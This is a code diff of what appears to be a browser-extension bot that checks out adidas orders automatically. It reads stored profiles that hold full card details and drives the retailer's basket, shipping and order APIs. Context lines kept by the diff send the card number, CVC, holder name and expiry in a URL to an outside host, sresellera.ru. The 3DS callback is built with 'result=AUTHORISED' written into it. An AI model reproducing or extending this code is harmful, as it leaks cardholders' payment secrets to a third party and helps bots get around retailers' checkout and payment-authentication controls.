@@ -35,9 +35,9 @@ async function post(path, params, method='post') {
   }
   
 adyenLib = document.createElement('script');
-adyenLib.type = 'text/javascript'
-adyenLib.src = 'https://live.adyen.com/hpp/js/df.js'
-document.body.appendChild(adyenLib)
+adyenLib.type = 'text/javascript';
+adyenLib.src = 'https://live.adyen.com/hpp/js/df.js';
+document.body.appendChild(adyenLib);
 adyenLib.onload = () => {
     let hiddenField = document.createElement('input')
     hiddenField.id = "hiddenAdyenInput"
@@ -49,11 +49,11 @@ adyenLib.onload = () => {
     script.onload = () => {}
 };
 
-siteHostname = window.location.hostname
+siteHostname = window.location.hostname;
 
 chrome.storage.local.get(null, function(storage){
     if (storage.adidas.status){
-        const sitepath = window.location.pathname.startsWith('/tr') ? '?sitePath=tr' : ''
+        const sitepath = window.location.pathname.startsWith('/tr') ? '?sitePath=tr' : '';
         profile = {
             "firstName": storage.profiles[storage.adidas.profile.tr]["name"].split(" ")[1],
             "lastName": storage.profiles[storage.adidas.profile.tr]["name"].split(" ")[0],
@@ -70,8 +70,7 @@ chrome.storage.local.get(null, function(storage){
             "cardCVC": storage.profiles[storage.adidas.profile.tr]["cardCVC"],
             "cardMonth": storage.profiles[storage.adidas.profile.tr]["cardDate"].split("/")[0],
             "cardYear": "20" + storage.profiles[storage.adidas.profile.tr]["cardDate"].split("/")[1]
-        }
-
+        };
         let atcURI = `https://${siteHostname}/api/checkout/baskets/-/items${sitepath}`;
         fetch(atcURI, {
             method: 'POST',
@@ -91,17 +90,17 @@ chrome.storage.local.get(null, function(storage){
             if (response.status == 200){
                 response.json().then(r => {
                     let res = (typeof r["shipmentList"] !== "undefined") ? r["shipmentList"][0]["productLineItemList"] : [];
-                    res.push({'productId':'endOfArr'})
+                    res.push({'productId':'endOfArr'});
                     for (let item of res){
                         if (item["productId"] === `${productID}_${storage.adidas.size.var}`){
                             (async () => {
-                                await sendNotification(`Added to cart ${productID} - ${storage.adidas.size.UK}`)
+                                await sendNotification(`Added to cart ${productID} - ${storage.adidas.size.UK}`);
                                 if (storage.adidas.aco){
-                                    await sendNotification(`Getting shipping rates`)
-                                    const response = await fetch(`https://${siteHostname}/api/chk/baskets/${r["basketId"]}/shipping_methods${sitepath}`)
-                                    const authToken = response.headers.get('authorization')
-                                    const shippings = await response.json()
-                                    await sendNotification(`Posting shipping details`)
+                                    await sendNotification(`Getting shipping rates`);
+                                    const response = await fetch(`https://${siteHostname}/api/chk/baskets/${r["basketId"]}/shipping_methods${sitepath}`);
+                                    const authToken = response.headers.get('authorization');
+                                    const shippings = await response.json();
+                                    await sendNotification(`Posting shipping details`);
                                     await fetch(`https://${siteHostname}/api/chk/baskets/${r["basketId"]}${sitepath}`, {
                                         method: 'PATCH',
                                         body: JSON.stringify({
@@ -157,20 +156,19 @@ chrome.storage.local.get(null, function(storage){
                                             'checkout-authorization': authToken,
                                             'content-type': 'application/json'
                                         }
-                                    })
-                                    await sendNotification(`Getting adyen`)
+                                    });
+                                    await sendNotification(`Getting adyen`);
                                     const responseAdyen = await fetch('https://sresellera.ru/2.0/adyen?' + new URLSearchParams({
                                         cardNumber : profile["cardNumber"],
                                         cvc : profile["cardCVC"],
                                         holderName : profile["cardName"],
                                         expiryMonth : profile["cardMonth"],
                                         expiryYear : profile["cardYear"],
-                                    }), {method: 'POST', mode: 'cors'})
-                                    const adyenToken = await responseAdyen.json()
-                                    console.log(adyenToken["data"])
-                                    document.querySelector('input#hiddenAdyenInput').value
-                                    const fingerprint = document.querySelector('input#hiddenAdyenInput').value
-                                    await sendNotification(`Checking out`)
+                                    }), {method: 'POST', mode: 'cors'});
+                                    const adyenToken = await responseAdyen.json();
+                                    document.querySelector('input#hiddenAdyenInput').value;
+                                    const fingerprint = document.querySelector('input#hiddenAdyenInput').value;
+                                    await sendNotification(`Checking out`);
                                     const sendCheckoutResponse = await fetch(`https://${siteHostname}/api/chk/orders${sitepath}`, {
                                         method: 'POST',
                                         headers: {
@@ -190,25 +188,34 @@ chrome.storage.local.get(null, function(storage){
                                             },
                                             "fingerprint": fingerprint
                                         })
-                                    }).then(r => r.json())
-                                    await sendNotification(`Opening 3DS`)
-                                    const sendTinkoff = await post('https://secure.tinkoff.ru/acs/auth/start.do', {
-                                        'PaReq': sendCheckoutResponse["paRedirectForm"]["formFields"]["PaReq"],
-                                        'MD': sendCheckoutResponse["paRedirectForm"]["formFields"]["MD"],
-                                        'TermUrl': `https://${siteHostname}/en/payment/callback/CREDIT_CARD/${r["basketId"]}/adyen?orderId=${sendCheckoutResponse["orderId"]}&encodedData=${sendCheckoutResponse["paRedirectForm"]["formFields"]["EncodedData"]}&result=AUTHORISED`
-                                    }, method='post')
-                                    let checkoutTimestamp = (new Date()).toJSON().split('T')[1].slice(0, -1)
-                                    await chrome.runtime.sendMessage({message: "publicSuccess", site: siteHostname, item: productID, size: storage.adidas.size.UK, time: checkoutTimestamp}, function(response){});
-                                    await chrome.runtime.sendMessage({message: "privateSuccess", status:'Successfully checked out!', site: siteHostname, item: productID, size: storage.adidas.size.UK, profile: storage.adidas.profile.tr, orderId: `${sendCheckoutResponse["orderId"]}`, image: item["productImage"]}, function(response){});
+                                    }).then(r => r.json());
+                                    if (typeof sendCheckoutResponse["paRedirectForm"] !== "undefined"){
+                                        let checkoutTimestamp = (new Date()).toJSON().split('T')[1].slice(0, -1);
+                                        await chrome.runtime.sendMessage({message: "publicSuccess", site: siteHostname, item: productID, size: storage.adidas.size.UK, time: checkoutTimestamp}, function(response){});
+                                        await chrome.runtime.sendMessage({message: "privateSuccess", status:'Successfully checked out!', site: siteHostname, item: productID, size: storage.adidas.size.UK, profile: storage.adidas.profile.tr, orderId: `${sendCheckoutResponse["orderId"]}`, image: item["productImage"]}, function(response){});
+                                        await sendNotification(`Opening 3DS`);
+                                        await post(sendCheckoutResponse["paRedirectForm"]["formAction"], {
+                                            'PaReq': sendCheckoutResponse["paRedirectForm"]["formFields"]["PaReq"],
+                                            'MD': sendCheckoutResponse["paRedirectForm"]["formFields"]["MD"],
+                                            'TermUrl': `https://${siteHostname}/en/payment/callback/CREDIT_CARD/${r["basketId"]}/adyen?orderId=${sendCheckoutResponse["orderId"]}&encodedData=${sendCheckoutResponse["paRedirectForm"]["formFields"]["EncodedData"]}&result=AUTHORISED`
+                                        }, method='post');
+                                    } else if (sendCheckoutResponse["status"] === "new"){
+                                        let checkoutTimestamp = (new Date()).toJSON().split('T')[1].slice(0, -1);
+                                        await chrome.runtime.sendMessage({message: "publicSuccess", site: siteHostname, item: productID, size: storage.adidas.size.UK, time: checkoutTimestamp}, function(response){});
+                                        await chrome.runtime.sendMessage({message: "privateSuccess", status:'Successfully checked out!', site: siteHostname, item: productID, size: storage.adidas.size.UK, profile: storage.adidas.profile.tr, orderId: `${sendCheckoutResponse["orderId"]}`, image: item["productImage"]}, function(response){});
+                                        await sendNotification(`Successfully checked out (No 3DS)`);
+                                    } else {
+                                        await sendError(`Failed to check out`);
+                                    }
                                 }
                             })()
                             break
                         } else if (item["productId"] === "endOfArr"){
                             sendError(`Failed to cart ${productID} - ${storage.adidas.size.UK}`)
-                        }
-                    }
-                })
-            }
+                        };
+                    };
+                });
+            };
         });
-    }
-})
+    };
+});
